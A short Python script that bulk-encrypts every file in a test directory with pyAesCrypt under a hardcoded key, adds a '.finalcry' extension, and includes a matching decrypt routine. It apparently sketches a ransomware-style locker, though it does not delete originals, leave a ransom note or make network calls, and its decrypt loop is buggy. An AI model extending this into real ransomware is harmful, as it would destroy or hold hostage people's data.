import os, random, base64
import get_files
import pyAesCrypt
# encryption/decryption buffer size - 64K
bufferSize = 64 * 1024
# encrypt
#pyAesCrypt.encryptFile("data.txt", "data.txt.aes", password, bufferSize)
## decrypt
#pyAesCrypt.decryptFile("data.txt.aes", "dataout.txt", password, bufferSize)
files = get_files.find_files("D:\\test")
crypted_files = get_files.find_encrypted("D:\\test")
key = "foopassword"
def encrypt_files(path, key):
    for file in files:
        pyAesCrypt.encryptFile(file, file+".finalcry", key, bufferSize)

def decrypt_files(path, key):
    for file in files:
        pyAesCrypt.decryptFile(file, file.replace(".finalcry", ""), key, bufferSize)


